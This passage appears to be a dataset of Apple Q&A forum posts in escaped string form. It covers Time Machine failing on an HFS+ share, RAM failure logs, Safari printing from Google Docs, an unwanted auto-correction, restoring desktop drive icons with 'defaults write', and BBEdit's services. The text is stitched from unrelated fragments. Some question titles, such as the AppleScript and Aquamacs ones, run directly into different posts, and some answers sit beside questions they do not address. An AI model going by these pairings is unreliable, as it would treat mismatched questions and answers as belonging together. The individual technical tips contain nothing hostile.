over \"SMB and AFP\"\nShare as Time Machine backup destination checked\n\nNext thing I tried was a TM backup on my local machine. Failed with error The network backup disk does not support the required capabilities. My first idea was to resetup my local Time Machine. I thus removed the TM-target and tried to readd it:\nsudo tmutil setdestination -ap afp://user@host.domain.tld/timemachine\nPassword:\nDestination password:\nDisk does not support Time Machine backups. (error 45)\nThe backup destination could not be added.\n\nSame result with SMB instead of AFP.\nThen I tried to run a backup on a different machine, same error as above. This machine still has the Mac Pro as a TM target as I didn't remove it yet.\nI checked the logs on my local machine and found that TM is trying to use /Volume/timemachine-4 as target. mount told me that there are several mounts to the Mac Pro, thus I unmounted everything and restarted my local machine. After that I was at least able to readd te Mac Pro as TM target (via AFP). But a backup resulted in the same error again: The network backup disk does not support the required capabilities.\nDoes anyone know which required capabilities are not provided (anymore)? Or do I need to open additional ports in the firewall between the two subnets?\nUpdate 1\nAfter trying this and that, I again removed the TM target, but can't readd it, even after a reboot.

Could this be the problem?\n\nA: There is a Lacie Raid attached to the Mac Pro. The Raid runs on HFS+, which doesn't get changed to APFS when updating the system to macOS 10.13 High Sierra. However, it seems that backing up onto a volume with HFS+ file system is not supported anymore.\nI created another share on the system disk, which is APFS by now, and was able to back up onto this disk.

However, before rebooting I didn't look at these screens so I don't have screenshot proof to send to the vendor that it is their modules at fault.\nIs a RAM failure somewhere captured in the system logs?\n\nA: No, normally RAM failures such as the one you describe cannot be captured in system logs.\nYou should RMA the RAM modules as usual.\n", "Q: How to replace the currently selected text in Applescript? How does Devontechnologies WordServices' do it? Devontechnologies offers a collection of services that let's the user perform some common tasks on text (upper case, lower case, ROT13 and so on).

For some reason when I press CMD + P or go to File>Print in Google Doc's instead of printing, the document is downloaded as a PDF. I then have to navigate to my downloads folder, open the PDF, and print it through Preview.\nThis only occurs in Safari. If I press CMD + P or File>Print in Chrome, the Chrome print dialog box comes up immediately and I am able to print directly from Chrome.\nHow can I get the print dialog to popup directly in Safari? Or if that can't be done is there a way to automatically identify that a document has been downloaded from Google Docs and print it? Maybe with an Apple Script?\n\nA: I have not found a way to get the print dialog box to appear in Safari.  Instead I have created a script that will check when something is downloaded and see if it is from Google Docs. If it is then the document will be opened in Preview with the print dialog box. Basically giving you similar functionality you have in Chrome. You can then print it as you normally would.\nHere's the script.

That will copy everything over so you can have not just your whatsapp info but the other application and user data.\nThat is the most efficient way to accomplish what you are asking for. \n", "Q: How can I configure Aquamacs auto-save?

This happens in TextEdit as well as Safari so it's not just a Safari thing. I've checked the Text tab under Keyboard in System Preferences and \"the Bible\" isn't there. I've also checked ~/Library/Spelling/LocalDictionary and it's blank. I've tried right clicking the selection to bring up the little menu to Add Spelling or Unlearn Spelling but I don't see those options.\nHere is a picture of the problem as I'm typing.\n\nHere is a picture of my text replacement settings.\n\nHere is a picture of the right click drop down menu.\n\nHere is a picture of the Show Spelling and Grammar window.\n\nMy laptop details:\nMacBook Pro (Retina, 15-inch, Late 2013) with a fresh install of High Sierra.

Unfortunately, it's trying to anticipate what you're typing and erroneously making the correction.  You either have to go back and manually change it back or click the \"X\" when it pops up so it doesn't make the change.\nThere's a good reference on capitalization rules and it appears what the grammar check is attempting to follow.\n", "Q: I removed my external drive icon on my macos, how do i put it back? As per title, I decided I wanted to remove my external drive icon (the one that is shown, usually, on the desktop) on my mac, but now I'm not able to put it back.\nThe problem is not due to the finder preferences, as external drive IS ticked.\nI remember doing it from the terminal with a command, but now I'm not able to revert that change.\nI did try with the following commands with no luck:\ndefaults write com.apple.finder ShowHardDrivesOnDesktop -bool true\ndefaults write com.apple.finder ShowRemovableMediaOnDesktop -bool true\n\nfrom this answer: How to show Hard Disk icon on Desktop via Terminal?\nand I've also tried with this command:\ndefaults write com.apple.finder CreateDesktop -bool true; killall Finder\n\nfrom here: http://www.idownloadblog.com/2016/02/01/how-to-hide-device-icons-on-your-mac-desktop/\nBut neither worked.\nAny help with this?

E.g., Make New Sticky Note or New BBEdit Document With Selection Where are services that belong to a certain application stored? E.g., Make New Sticky Note or New BBEdit Document With Selection.\nThey are not in /System/Library/Services nor in ~/Library/Services or in the application bundle.\nI have run opensnoop and launched Make New Sticky Note but opensnoop didn't return any relevant file i/o.\n\nA: macOS applications such as BBEdit can create their own contextual services from within the application framework and tell the operating system to display those services as appropriate. This is why they don't appear in the system's (or the user's) Services or Quick Actions folders.\nApplication Bundles\nApplications contain files and folders within a bundle or package and the instructions to create/show those contextual services is contained within the bundle. CTRL-click on the application and you'll see a context menu item Show Package Contents. Selecting this option will open the bundle and you can browse its contents. Be extremely careful when mucking about in the application's folders and files as you may inadvertently break it. BBEdit's custom contextual services are created from within its bundle.\nThe info.plist File\nWithin every macOS application bundle is a required file called info.plist. Open the copy of the info plist file in BBEdit and have a look at its contents. I would strongly recommend you make a copy of the plist file rather than mess up the original. Within the file, there are several services established that are identified with the key NSMenuItem.  These entries create the link between the application and the Services menu within the appropriate context. For example, search for the string \"Search Here in BBEdit\" and you will find the plist entry for that service. As of BBEdit v14.0.1, there are six such services listed.\nThis is not unique to BBEdit in any way as any application can create its own services in this way.\n"]
